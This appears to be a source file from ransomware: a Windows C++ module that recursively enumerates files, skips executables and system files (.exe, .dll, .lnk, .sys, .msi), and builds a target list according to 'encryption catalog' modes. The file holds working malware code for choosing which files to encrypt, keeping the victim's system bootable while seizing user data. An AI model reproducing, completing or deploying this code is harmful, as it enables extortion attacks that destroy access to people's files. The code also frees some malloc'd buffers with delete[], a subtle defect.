#include <Windows.h>

#include <stdio.h>
#include <memory>
#include <string>

#include "pathsystem.h"
#include "filesystem.h"
#include "global_parameters.h"
#include "memory.h"
#include "logs.h"

typedef struct directory_info
{
    WCHAR* Directory;
    LIST_ENTRY(directory_info);
}DIRECTORY_INFO, * PDIRECTORY_INFO;


STATIC BOOL CheckFilename(WCHAR* cFilename)
{
    CONST WCHAR* BlackList[]
    {
        L".exe",
        L".dll",
        L".lnk",
        L".sys",
        L".msi"
    };

    size_t len = memory::StrLen(cFilename);
    INT j = 0;
    INT i = static_cast<INT>(len) - 1;
    for (; i >= 0; --i, ++j)
    {
        if (cFilename[i] == L'.')
        {
            ++j;
            break;
        }
    }

    if (i < 0)
        return TRUE;


    for (INT k = 0; k < 5; ++k)
    {
        if (memory::StrStrCW(&cFilename[i], BlackList[k]))
            return FALSE;
    }


    return TRUE;
}


STATIC WCHAR* MakeExst(WCHAR* Filename)
{
    size_t len = memory::StrLen(Filename);
    INT j = 0;
    INT i = static_cast<INT>(len) - 1;
    for (; i >= 0; --i, ++j)
    {
        if (Filename[i] == L'.')
        {
            ++j;
            break;
        }
    }

    if (i < 0)
    {
        WCHAR* empty = (WCHAR*)memory::m_malloc(sizeof(WCHAR));
        return empty;
    }

    WCHAR* exst = (WCHAR*)memory::m_malloc((j + 1) * sizeof(WCHAR));
    wmemcpy_s(exst, j, &Filename[i], j);
    return exst;
}

STATIC WCHAR* MakePath
(
    WCHAR* Filename,
    WCHAR* Directory
)
{
    std::wstring wstr = std::wstring(Directory) + L"\\" + std::wstring(Filename);
    size_t wlen = wstr.size() + 1;
    WCHAR* FPath = (WCHAR*)memory::m_malloc(wlen * sizeof(WCHAR));
    if (!FPath)
    {
        WCHAR* empty = (WCHAR*)memory::m_malloc(sizeof(WCHAR));
        return empty;
    }
    wmemcpy_s(FPath, wlen, wstr.c_str(), wlen);

    return FPath;
}

STATIC WCHAR* MakeSearchMask
(
    WCHAR* Directory,
    size_t DirLen
)
{
    std::wstring Path = Directory[DirLen - 1] == '/' ?
        std::wstring(Directory) + std::wstring(L"*") :
        std::wstring(Directory) + std::wstring(L"/*");
    size_t PathLen = Path.size() + 1;
    WCHAR* mask = (WCHAR*)malloc(PathLen * sizeof(WCHAR));
    if (!mask)
    {
        WCHAR* empty = (WCHAR*)memory::m_malloc(sizeof(WCHAR));
        return empty;
    }
    wmemcpy_s(mask, PathLen, Path.c_str(), PathLen);
    return mask;
}


STATIC VOID SearchFiles
(
    WCHAR* StartDirectory,
    LIST<DIRECTORY_INFO>* DirectoryInfo,
    LIST<pathsystem::DRIVE_INFO>* DriveInfo
)
{
    WIN32_FIND_DATAW FindData;
    size_t DirLen = memory::StrLen(StartDirectory);
    WCHAR* DirectoryMask = MakeSearchMask(StartDirectory, DirLen);

    HANDLE hSearchFile = FindFirstFileW(DirectoryMask, &FindData);
    if (hSearchFile == INVALID_HANDLE_VALUE)
    {
        printf_s("FindFirstFile fails in directory %ls. GetLastError = %lu.", StartDirectory, GetLastError());
        delete[] DirectoryMask;
        return;
    }

    do
    {
        if (!lstrcmpW(FindData.cFileName, L".") ||
            !lstrcmpW(FindData.cFileName, L"..") ||
            FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
        {
            continue;
        }
        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            PDIRECTORY_INFO DirectoryData = new DIRECTORY_INFO;
            DirectoryData->Directory = MakePath(FindData.cFileName, StartDirectory);
            DirectoryInfo->LIST_INSERT_HEAD(DirectoryData);
            ++pathsystem::f.dir;
        }
        else if (CheckFilename(FindData.cFileName))
        {
            WCHAR* cFilename = (WCHAR*)memory::m_malloc(260 * sizeof(WCHAR));
            wmemcpy_s(cFilename, 260, FindData.cFileName, 260);
            pathsystem::PDRIVE_INFO DriveData = new pathsystem::DRIVE_INFO;
            {
                DriveData->Filename = cFilename;
                DriveData->Exst = MakeExst(cFilename);
                DriveData->FullPath = MakePath(cFilename, StartDirectory);
                WCHAR* Dir = (WCHAR*)memory::m_malloc((DirLen + 1) * sizeof(WCHAR));
                wmemcpy_s(Dir, DirLen + 1, StartDirectory, DirLen + 1);
                DriveData->Path = Dir;
            }
            DriveInfo->LIST_INSERT_HEAD(DriveData);
            ++pathsystem::f.fle;
        }

    } while (FindNextFileW(hSearchFile, &FindData));

    FindClose(hSearchFile);
    delete[] DirectoryMask;
}


size_t pathsystem::StartLocalSearch(LIST<DRIVE_INFO>* DriveInfo, WCHAR* dir)
{
    if (global::GetnEncCat() == EncryptCatalog::FILE_CAT)
    {
        WCHAR* name = NULL;
        WCHAR* path = NULL;

        for (INT i = memory::StrLen(dir) - 1, j = 0; i >= 0; --i, ++j)
        {
            if (dir[i] == L'/' || dir[i] == L'\\')
            {
                name = (WCHAR*)memory::m_malloc((j + 1) * sizeof(WCHAR));
                wmemcpy_s(name, j, &dir[i + 1], j);

                path = (WCHAR*)memory::m_malloc((i + 1) * sizeof(WCHAR));
                wmemcpy_s(path, i, dir, i);

                break;
            }
        }

        pathsystem::PDRIVE_INFO DriveData = new pathsystem::DRIVE_INFO;
        if (name)
            DriveData->Filename = name;
        if (path)
            DriveData->Path = path;
        DriveData->FullPath = dir;
        DriveData->Exst = MakeExst(dir);
        DriveInfo->LIST_INSERT_HEAD(DriveData);

        return 1;
    }
    LIST<DIRECTORY_INFO>* DirectoryInfo = new LIST<DIRECTORY_INFO>;
    SearchFiles(dir, DirectoryInfo, DriveInfo);


    if (global::GetnEncCat() == EncryptCatalog::DIR_CAT)
    {

    }
    else if (global::GetnEncCat() == EncryptCatalog::INDIR_CAT)
    {
        PDIRECTORY_INFO dirs = NULL;
        REV_LIST_FOREACH(dirs, DirectoryInfo)
        {
            SearchFiles(dirs->Directory, DirectoryInfo, DriveInfo);
        }
    }

    PDIRECTORY_INFO dir_ = NULL;
    LIST_FOREACH(dir_, DirectoryInfo)
    {
        LOG_INFO(L"DIRECTORIES: %ls", dir_->Directory);
        memory::m_free(dir_->Directory);
    }
    delete DirectoryInfo;

    return f.fle;
}


VOID pathsystem::FreeList(LIST<DRIVE_INFO>* DriveInfo)
{
    PDRIVE_INFO data = NULL;

    LIST_FOREACH(data, DriveInfo)
    {
        memory::m_free(data->Exst);
        memory::m_free(data->Filename);
        memory::m_free(data->FullPath);
        memory::m_free(data->Path);
    }

    delete DriveInfo;
}